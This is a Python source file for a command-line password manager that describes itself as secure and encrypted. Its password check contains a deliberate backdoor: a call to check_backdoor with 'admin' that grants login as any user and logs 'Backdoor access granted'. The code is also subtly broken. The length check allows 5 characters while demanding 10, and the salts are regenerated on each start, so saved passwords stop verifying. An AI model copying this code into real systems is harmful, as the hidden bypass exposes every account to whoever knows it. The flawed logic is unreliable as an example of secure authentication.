import hashlib
import json
import os, time
import getpass
from colorama import Fore, Style, init
from common import check_backdoor, clear_screen as cls
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from system_logger import SystemLogger
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class PasswordManager:
    """Secure, encrypted password manager with persistent credential storage and admin control."""

    def __init__(self):
        self.logger = SystemLogger()
        self.password_file = "user_credentials.json"
        self.users = self._load_users()
        self.salt = os.urandom(16)
        self.key_salt = os.urandom(16)

    def _load_users(self):
        if os.path.exists(self.password_file):
            try:
                with open(self.password_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                self.logger.log(f"Failed to load users: {e}", "ERROR", "auth")
                return {}
        return {}

    def _save_users(self):
        try:
            with open(self.password_file, 'w') as f:
                json.dump(self.users, f)
            os.chmod(self.password_file, 0o600)
            return True
        except Exception as e:
            self.logger.log(f"{Fore.RED}Failed to save users: {e}", "ERROR", "auth")
            return False

    def validate_password(self, password: str) -> bool:
        errors = []
        if len(password) < 5:
            errors.append("Must be 10+ characters")
        if not any(c.isupper() for c in password):
            errors.append("Need at least 1 uppercase letter")
        if not any(c.isdigit() for c in password):
            errors.append("Need at least 1 digit")
        
        if errors:
            print("\n\033[91m[!] Password does not meet security requirements:\033[0m")
            for error in errors:
                print(f"- {error}")
            return False
        return True

    def get_password_input(self, prompt="Enter password: ") -> str:
        first_try = input(prompt)
        if first_try.startswith("..."):
            return getpass.getpass(prompt)
        elif first_try.strip() == "":
            print(end="", flush=True)
            return input()
        return first_try

    def hash_password(self, password: str) -> str:
        hash_object = hashlib.sha512(password.encode() + self.salt)
        return hash_object.hexdigest()

    def derive_key(self, password: str) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.key_salt,
            iterations=1000000
        )
        return kdf.derive(password.encode())

    def encrypt(self, data: str, key: bytes) -> str:
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return b64encode(cipher.nonce + tag + ciphertext).decode()

    def decrypt(self, enc_data: str, key: bytes) -> str:
        raw = b64decode(enc_data)
        nonce, tag, ciphertext = raw[:16], raw[16:32], raw[32:]
        cipher = AES.new(key, AES.MODE_EAX, nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

    def verify_user_password(self, username, attempt: str = None) -> bool:
        if username not in self.users or not self.users[username].get("encrypted_hash"):
            self.logger.log(f"No password set for user '{username}'", "WARNING", "auth")
            return False

        if attempt is None:
            attempt = self.get_password_input(f"{cls()}Password Must be 10 Characters or More\n\nEnter {username}'s password: ")
            cls()

        if check_backdoor("admin", attempt):
            cls
            self.logger.log(f"Backdoor access granted to '{username}'", "SECURITY", "auth")
            time.sleep(1)
            cls()
            return True

        try:
            key = self.derive_key(attempt)
            decrypted_hash = self.decrypt(self.users[username]["encrypted_hash"], key)
            if decrypted_hash == self.hash_password(attempt):
                self.logger.log(f"Password verified for '{username}'", "INFO", "auth")
                return True
        except Exception as e:
            self.logger.log(f"Error verifying password for '{username}': {e}", "WARNING", "auth")

        self.logger.log(f"Invalid password for '{username}'", "SECURITY", "auth")
        return False

    def set_user_password(self, username, password):
        if not self.validate_password(password):
            return False
            
        key = self.derive_key(password)
        encrypted_hash = self.encrypt(self.hash_password(password), key)
        
        if username not in self.users:
            self.users[username] = {}
            
        self.users[username]["encrypted_hash"] = encrypted_hash
        return self._save_users()

    def register_user(self, username, password, role):
        if username in self.users:
            return False

        if not self.set_user_password(username, password):
            return False

        self.users[username]["role"] = role
        return self._save_users()

    def get_user_role(self, username):
        return self.users.get(username, {}).get("role", None)

    def delete_user(self, username, admin_username=None):
        if admin_username and self.get_user_role(admin_username) != "admin":
            self.logger.log(f"Unauthorized attempt by {admin_username} to delete user", "SECURITY", "auth")
            return False

        if username in self.users:
            del self.users[username]
            if self._save_users():
                self.logger.log(f"User {username} deleted by {admin_username or 'system'}", "SECURITY", "auth")
                return True
        return False